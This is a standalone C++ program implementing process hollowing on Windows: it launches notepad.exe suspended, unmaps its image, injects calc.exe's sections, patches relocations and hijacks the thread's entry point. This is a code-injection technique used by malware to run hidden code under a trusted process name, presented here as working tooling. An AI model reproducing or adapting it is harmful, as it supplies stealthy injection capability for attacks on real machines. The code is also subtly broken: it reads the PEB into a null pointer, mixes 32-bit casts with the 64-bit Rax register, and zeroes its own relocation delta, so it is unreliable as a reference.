#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main()
{
    HANDLE hTargetProc;

    // Create hollow target proc in suspended state
    LPSTARTUPINFOA si = new STARTUPINFOA();
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    BOOL createProcReturn = CreateProcessA(NULL, (LPSTR)"C:\\Windows\\system32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
    if (!createProcReturn)
    {
        printf("[!] Error starting notepad: %d", GetLastError());
        return 1;
    }
    hTargetProc = pi->hProcess;

    // Get procs PEB
    PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
    DWORD returnLength;
    LONG(WINAPI * NtQueryInformationProcess)(HANDLE ProcessHandle,
        ULONG ProcessInformationClass, PVOID ProcessInformation,
        ULONG ProcessInformationLength, PULONG ReturnLength);

    *(FARPROC*)&NtQueryInformationProcess = GetProcAddress(
        LoadLibrary(L"ntdll"), "NtQueryInformationProcess");

    NtQueryInformationProcess(hTargetProc, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    if (returnLength == 0)
    {
        printf("[!] Error getting target procs peb address: %d", GetLastError());
        return 1;
    }

    // Get ImageBaseAddress from PEB
    DWORD targetProcImageBaseAddressLocation = (DWORD)(pbi->PebBaseAddress + 0x08);
    LPVOID targetProcImageBase = 0;
    SIZE_T bytesRead = NULL;
    ReadProcessMemory(hTargetProc, (LPCVOID)targetProcImageBaseAddressLocation, targetProcImageBase, 4, &bytesRead);

    // read source PE
    HANDLE peFile = CreateFileA("C:\\Windows\\system32\\calc.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    DWORD peFileSize = GetFileSize(peFile, NULL);
    LPDWORD fileBytesRead = 0;
    LPVOID peFileBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, peFileSize);
    ReadFile(peFile, peFileBuffer, peFileSize, NULL, NULL);

    // get size of source image
    PIMAGE_DOS_HEADER peFileImageDosHeaders = (PIMAGE_DOS_HEADER)peFileBuffer;
    PIMAGE_NT_HEADERS peFileImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)peFileBuffer + peFileImageDosHeaders->e_lfanew);
    SIZE_T peFileImageSize = peFileImageNTHeaders->OptionalHeader.SizeOfImage; // Gets the size(in bytes) of the image, including all headers, as the image is loaded in memory.

    /* Hollowing */
    
    // 1) unmap target process image
    NtUnmapViewOfSection ntUnmap = (NtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");
    ntUnmap(hTargetProc, targetProcImageBase);
    
    // 2) allocate memory for pe in target process image 
    LPVOID baseOfNewPeFileImage = VirtualAllocEx(hTargetProc, NULL, peFileImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    targetProcImageBase = baseOfNewPeFileImage;
    
    // set PE image base address to the allocated memory 
    peFileImageNTHeaders->OptionalHeader.ImageBase = (DWORD)baseOfNewPeFileImage;
    // copy the pe Image headers to the target procs unmapped memory
    WriteProcessMemory(hTargetProc, baseOfNewPeFileImage, peFileBuffer, peFileImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
    // iterate over sections and copy sections to unmapped memory
    PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)peFileBuffer + peFileImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    for (int i = 0; i < peFileImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        PVOID destinationSectionLocation = (PVOID)((DWORD)targetProcImageBase + sourceImageSection->VirtualAddress);
        PVOID sourceSectionLocation = (PVOID)((DWORD)peFileBuffer + sourceImageSection->PointerToRawData);
        WriteProcessMemory(hTargetProc, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
        sourceImageSection++; // next section
    }

    // 3) adjust reolcation table
    // get address of the relocation table
    IMAGE_DATA_DIRECTORY relocationTable = peFileImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    // get delta between pe file "normal" image addr base and new base
    DWORD deltaImageBase = (DWORD)baseOfNewPeFileImage - peFileImageNTHeaders->OptionalHeader.ImageBase;

    // patch relocations
    sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)peFileBuffer + peFileImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    for (int i = 0; i < peFileImageNTHeaders->FileHeader.NumberOfSections; i++)
    {
        // look for relocation section
        BYTE* relocSectionName = (BYTE*)".reloc";
        if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
        {
            sourceImageSection++; continue;
        }

        DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        // for each relocation
        while (relocationOffset < relocationTable.Size)
        {
            // base block
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)peFileBuffer + sourceRelocationTableRaw + relocationOffset);
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);

            // get number of entries in block
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)peFileBuffer + sourceRelocationTableRaw + relocationOffset);

            // for each entry in relocation block
            for (DWORD j = 0; j < relocationEntryCount; j++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY); // increment offset by size of entry
                if (relocationEntries[j].Type == IMAGE_REL_BASED_ABSOLUTE)
                {
                    continue; // skip absolute address https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#the-reloc-section-image-only
                }
                // get patch address
                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[j].Offset;
                DWORD patchedBuffer = 0;
                // read value at relocation entry address
                ReadProcessMemory(hTargetProc, (LPCVOID)((DWORD)targetProcImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
                // adjust by delta
                patchedBuffer += deltaImageBase;
                // write patched buffer to image
                WriteProcessMemory(hTargetProc, (PVOID)((DWORD)targetProcImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
            }
        }
        
        // get context of the target process thread
        LPCONTEXT context = new CONTEXT();
        context->ContextFlags = CONTEXT_INTEGER;
        GetThreadContext(pi->hThread, context);

        // update target image entrypoint to the new entrypoint (image base addr + RVA of entrypoint according to PE file image header)
        DWORD patchedEntryPoint = (DWORD)targetProcImageBase + peFileImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
        context->Rax = patchedEntryPoint;
        SetThreadContext(pi->hThread, context);

        // Resume the target processes thread
        ResumeThread(pi->hThread);

        return 0;
    }
}